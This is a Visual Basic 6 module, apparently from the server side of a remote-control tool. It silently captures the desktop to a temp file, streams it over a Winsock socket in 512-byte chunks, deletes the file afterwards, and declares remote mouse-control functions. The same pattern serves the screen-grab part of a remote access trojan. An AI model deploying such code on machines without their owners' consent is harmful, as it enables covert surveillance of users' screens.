Attribute VB_Name = "DesktopModule"
Option Explicit

Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source
Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Public Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Public Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
Public Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Public Const MOUSEEVENTF_ABSOLUTE = &H8000 '  absolute move
Public Const MOUSEEVENTF_LEFTDOWN = &H2 '  left button down
Public Const MOUSEEVENTF_LEFTUP = &H4 '  left button up
Public Const MOUSEEVENTF_MIDDLEDOWN = &H20 '  middle button down
Public Const MOUSEEVENTF_MIDDLEUP = &H40 '  middle button up
Public Const MOUSEEVENTF_MOVE = &H1 '  mouse move
Public Const MOUSEEVENTF_RIGHTDOWN = &H8 '  right button down
Public Const MOUSEEVENTF_RIGHTUP = &H10 '  right button up

Function GetRect() As String
Dim ScreenSize As RECT, txtData As String
    GetWindowRect GetDesktopWindow(), ScreenSize
    'txtData = (ScreenSize.Left + ScreenSize.Right) & "#" & (ScreenSize.Top + ScreenSize.Bottom) & "#"
    txtData = (ScreenSize.Right) & "#" & (ScreenSize.Bottom) & "#"
    GetRect = txtData
End Function

Function CopyDesktop() As String
Dim DeskDC As Long, Ret As Long
Dim FilePath As String
Dim DeskRect As RECT
    
    FilePath = String(255, Chr$(0))
    GetTempPath 256, FilePath
    FilePath = Left(FilePath, InStr(1, FilePath, Chr$(0)) - 1)
    FilePath = FilePath & "\Desk.BMP"
    ServerForm.Picture1.Width = Screen.Width
    ServerForm.Picture1.Height = Screen.Height
    ServerForm.Refresh
    DeskDC = GetWindowDC(GetDesktopWindow())
    BitBlt ServerForm.Picture1.hDC, 0, 0, ServerForm.Picture1.ScaleWidth, ServerForm.Picture1.ScaleHeight, DeskDC, 0, 0, SRCCOPY
    ServerForm.Picture1.Refresh
    SavePicture ServerForm.Picture1.Image, FilePath
    CopyDesktop = FilePath
End Function

Sub SendDesktop(FilePath As String, Socket As Winsock)
Dim txtData As String, FileNumber As Integer
Dim Counter As Long, FileLength As Long
Dim SmallFile As Boolean

On Error GoTo LostConnection
    
    FileNumber = FreeFile()
    Open FilePath For Binary As #FileNumber
        FileLength = LOF(FileNumber)
        DoEvents
        Socket.SendData ("FileSize#" & FileLength)
        'Sleep (1)
        txtData = String(512, " ")
        Get #FileNumber, 1, txtData
        Counter = Len(txtData)
        If FileLength > 512 Then
            SmallFile = False
        Else
            SmallFile = True
        End If
        Do While Counter <= FileLength
            If CancelDownload = True Then
                DoEvents
                Counter = FileLength
            End If
            DoEvents
            Socket.SendData ("DownloadFile#" & txtData)
            'Sleep (1)
            txtData = String(512, " ")
            Get #FileNumber, Counter + 1, txtData
            If Counter + 512 > FileLength Then
                Dim tmplen As Long
                tmplen = FileLength - Counter
                If tmplen < 0 Then
                    txtData = Chr(0)
                Else
                    txtData = (Mid(txtData, 1, tmplen))
                End If
                Exit Do
            End If
            Counter = Counter + 512
        Loop
        
    Close #FileNumber
    
    DoEvents
    If SmallFile = True Then
        Socket.SendData ("DownloadFile#" & Mid(txtData, 1, FileLength))
    Else
        Socket.SendData ("DownloadFile#" & txtData)
    End If
    'Sleep (1)
    DoEvents
    Socket.SendData ("DownloadComplete#" & Chr(0))
    DeleteFile FilePath
    Exit Sub
LostConnection:
End Sub

